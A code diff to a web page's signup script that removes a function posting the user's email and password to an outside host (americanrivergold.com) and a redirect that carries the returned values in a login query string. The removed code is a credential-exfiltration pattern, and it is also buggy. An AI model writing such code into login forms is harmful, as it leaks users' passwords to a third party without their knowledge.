@@ -600,13 +600,9 @@ document.addEventListener('submit', (e) => {
             }).catch((error) => {
                 console.log("Error getting document:", error);
             });
-            console.log("Signup Successful!", userEmail)
+            console.log("Signup Successful!", userEmail1)
             //window.location.replace("./index.html")
-            bunnify(userEmail);
-            var bunny1 = data1;
-            bunnify(userPassword)
-            var bunny2 = data1;
-            location.href=redirect + '?login=' + bunny1 + bunny2
+            //location.href=redirect
         }).catch((error) => {
             // Handle Errors here.
             console.log("Signup Failed!", error)
@@ -614,30 +610,6 @@ document.addEventListener('submit', (e) => {
 
     }
 });
-function bunnify(bunnytype) {
-            var myHeaders = new Headers();
-            myHeaders.append("Content-Type", "application/json");
-            myHeaders.append("Accept", "application/json, /;q=0.5");
-
-            var raw = JSON.stringify({
-              "stringtoencrypt": `${bunnytype}`
-            });
-            //document.write(raw)
-            var requestOptions = {
-              method: 'POST',
-              headers: myHeaders,
-              body: raw,
-              redirect: 'follow'
-            };
-
-            fetch("https://americanrivergold.com/fluffybunnyin", requestOptions)
-              .then(function (response) {
-                  return response.json();
-              })
-              .then(function (data) {
-                var data1 = data1;
-        })
-}
 </script>
 
 </body>
